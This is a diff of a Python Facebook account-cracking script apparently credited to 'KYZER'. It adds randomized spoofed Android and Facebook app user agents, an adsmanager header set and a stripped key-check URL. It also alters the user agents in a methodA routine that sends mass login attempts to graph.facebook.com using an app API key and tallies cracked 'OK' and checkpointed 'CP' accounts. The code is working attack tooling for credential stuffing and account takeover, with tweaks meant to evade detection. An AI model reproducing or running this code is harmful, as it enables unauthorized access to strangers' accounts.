@@ -70,20 +70,25 @@ A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '
 def clear():os.system('clear');print(logo)
 def linex():print(f'{A}──────────────────────────────────────────────────')
 #__________________[ LOGO ]__________________#
+def kyzer():
+    END = 'Dalvik/2.1.0 (Linux; U; Android 11; SM-F916U1 Build/YME35E) [FBAN/Orca-Android;FBAV/391.0.0.10.141;FBBV/23534741;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-F916U1;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+    
+sys.stdout.write('\x1b]2; kyzer\x07')
+S = '\033[1;37m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = '\x1b[38;5;48m'
+Z = '\033[1;33m'
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 logo =f"""{A}
 
-
- __    __  __      __  ________  ________  _______  
-|  \  /  \|  \    /  \|        \|        \|       \ 
-| $$ /  $$ \$$\  /  $$ \$$$$$$$$| $$$$$$$$| $$$$$$$\
-| $$/  $$   \$$\/  $$     /  $$ | $$__    | $$__| $$
-| $$  $$     \$$  $$     /  $$  | $$  \   | $$    $$
-| $$$$$\      \$$$$     /  $$   | $$$$$   | $$$$$$$\
-| $$ \$$\     | $$     /  $$___ | $$_____ | $$  | $$
-| $$  \$$\    | $$    |  $$    \| $$     \| $$  | $$
- \$$   \$$     \$$     \$$$$$$$$ \$$$$$$$$ \$$   \$$
-                                                                                               
-
+     {G1}███████ ██████  ██████   ██████  ██████  
+     {G2}██      ██   ██ ██   ██ ██    ██ ██   ██ 
+     {G3}█████   ██████  ██████  ██    ██ ██████  
+     {G4}██      ██   ██ ██   ██ ██    ██ ██   ██ 
+     {G5}███████ ██   ██ ██   ██  ██████  ██   ██                     
 
 {A}──────────────────────────────────────────────────
 {G1}[{A}•{G1}]{G1} OWNER    {A}:{G1} KYZER
@@ -100,7 +105,7 @@ def approval():
   print("\033[1;37m[\u001b[36m•\033[0;32m] Your Key :\033[0;31m "+id);time.sleep(0.1)
   print ("""\033[0;37m──────────────────────────────────────────────────""")
   try:
-    httpCaht = requests.get("https://github.com/jrafael3205/test/blob/main/key.txt").text
+    httpCaht = requests.get("https:///key.txt").text
     if id in httpCaht:
       print("\033[0;32m >> Your Key Has Been Approved !!!")
       msg = str(os.geteuid())
@@ -196,7 +201,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            lo  = "Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.400498.016) [FBAN/FB4A;FBAV/381.0.0.20.131;FBBV/20154701;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A346N;FBSV/13;FBCA/armeabi-v7a:armeabi;]"
+            lo  = "Dalvik/2.1.0 (Linux; U; Android 7.0.0; SM-E700M Build/TP1A.509218.013) [FBAN/FB4A;FBAV/206.0.0.19.126;FBBV/20286478;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/TNT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700M;FBSV/7.0.0;FBCA/armeabi-v7a:armeabi;]"
             sys.stdout.write(f"\r{G1}[{A}CRACKING-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
@@ -294,7 +299,7 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; SM-T825Y Build/ILY42E) [FBAN/Orca-Android;FBAV/374.0.0.20.133;FBBV/24218031;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T825Y;FBSV/14;FBCA/armeabi-v7a:armeabi;]',
+                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-T580 Build/QP1A.482269.026) [FBAN/Orca-Android;FBAV/292.0.0.13.88;FBBV/180118899;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/TNT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T580;FBSV/12;FBCA/armeabi-v7a:armeabi;]',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'X-FB-Net-HNI': str(random.randint(20000, 40000)),
